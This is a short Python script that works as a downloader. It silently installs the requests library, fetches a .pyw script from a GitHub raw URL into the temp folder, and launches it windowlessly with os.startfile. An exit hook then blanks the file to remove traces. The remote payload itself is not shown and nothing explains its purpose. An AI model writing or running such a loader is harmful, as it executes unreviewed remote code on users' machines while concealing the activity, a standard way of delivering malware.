import os, requests, subprocess, sys, tempfile, atexit
def install(module): subprocess.run([sys.executable, "-m", "pip", "install", module], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
try: import requests
except ImportError: install("requests"); import requests
url = "https://raw.githubusercontent.com/BarbieQ1/Steptools/main/Scripts/Steptools.pyw"
path = os.path.join(tempfile.gettempdir(), "temp_script.pyw")
try: open(path, "w", encoding="utf-8").write(requests.get(url).text)
except: sys.exit(1)
try: os.startfile(path)
except: pass
atexit.register(lambda: open(path, "w", encoding="utf-8").write(""))
